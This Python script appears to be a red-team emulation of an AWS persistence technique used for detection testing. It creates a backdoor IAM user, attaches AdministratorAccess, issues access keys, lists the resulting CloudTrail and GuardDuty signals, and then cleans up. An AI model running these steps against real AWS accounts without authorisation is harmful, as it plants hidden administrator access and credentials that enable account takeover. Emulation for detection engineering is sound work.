"""
Technique : aws.persistence.iam-create-admin-user
Tactic    : Persistence (T1136.003)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.iam-create-admin-user/

Pre-requisites:
  - None. This technique creates and cleans up its own resources.
  - AWS credentials must have:
      iam:CreateUser, iam:AttachUserPolicy, iam:CreateAccessKey,
      iam:ListAccessKeys, iam:DeleteAccessKey, iam:DetachUserPolicy,
      iam:DeleteUser

Detection signal:
  - iam:CreateUser immediately followed by iam:AttachUserPolicy
    (with AdministratorAccess) from the same principal.
  - GuardDuty finding: Persistence:IAMUser/UserPermissions
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import os
import time

import boto3

# ── Config ────────────────────────────────────────────────────────────────────
BACKDOOR_USERNAME    = "malicious-iam-user"
ADMIN_POLICY_ARN     = "arn:aws:iam::aws:policy/AdministratorAccess"
DWELL_TIME_S         = int(os.environ.get("DWELL_TIME_S", "10"))

TAGS = [{"Key": "StratusRedTeam", "Value": "true"}]


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    session = boto3.Session()
    iam     = session.client("iam")

    # ── Step 1: Create backdoor IAM user ──────────────────────────────────────
    banner("Step 1 — Create backdoor IAM user (CreateUser)")
    iam.create_user(UserName=BACKDOOR_USERNAME, Tags=TAGS)
    print(f"  [+] Created IAM user: {BACKDOOR_USERNAME}")

    # ── Step 2: Attach AdministratorAccess policy ─────────────────────────────
    banner("Step 2 — Attach AdministratorAccess policy (AttachUserPolicy)")
    iam.attach_user_policy(
        UserName=BACKDOOR_USERNAME,
        PolicyArn=ADMIN_POLICY_ARN,
    )
    print(f"  [+] Attached: {ADMIN_POLICY_ARN}")
    print("  [!] CloudTrail: CreateUser + AttachUserPolicy (AdministratorAccess)")
    print("  [!] GuardDuty may raise: Persistence:IAMUser/UserPermissions")

    # ── Step 3: Generate access key credentials ────────────────────────────────
    banner("Step 3 — Create access key (CreateAccessKey)")
    resp = iam.create_access_key(UserName=BACKDOOR_USERNAME)
    key  = resp["AccessKey"]
    print(f"  [+] Access Key ID: {key['AccessKeyId']}")
    print(f"  [+] Secret Key   : {key['SecretAccessKey'][:8]}...")
    print("  [!] Attacker now holds persistent admin credentials")

    # ── Dwell ─────────────────────────────────────────────────────────────────
    if DWELL_TIME_S > 0:
        print(f"\n[*] Dwelling for {DWELL_TIME_S}s before cleanup (DWELL_TIME_S)")
        time.sleep(DWELL_TIME_S)

    # ── Cleanup ───────────────────────────────────────────────────────────────
    banner("Cleanup — Remove backdoor user and credentials")

    existing_keys = iam.list_access_keys(UserName=BACKDOOR_USERNAME)["AccessKeyMetadata"]
    for k in existing_keys:
        iam.delete_access_key(UserName=BACKDOOR_USERNAME, AccessKeyId=k["AccessKeyId"])
        print(f"  [+] Deleted access key: {k['AccessKeyId']}")

    iam.detach_user_policy(UserName=BACKDOOR_USERNAME, PolicyArn=ADMIN_POLICY_ARN)
    print(f"  [+] Detached: {ADMIN_POLICY_ARN}")

    iam.delete_user(UserName=BACKDOOR_USERNAME)
    print(f"  [+] Deleted IAM user: {BACKDOOR_USERNAME}")

    banner("Complete")
    print("All resources cleaned up. CloudTrail events generated:")
    print("  - iam:CreateUser")
    print("  - iam:AttachUserPolicy (AdministratorAccess)")
    print("  - iam:CreateAccessKey")
    print("  - iam:DeleteAccessKey")
    print("  - iam:DetachUserPolicy")
    print("  - iam:DeleteUser")


if __name__ == "__main__":
    main()
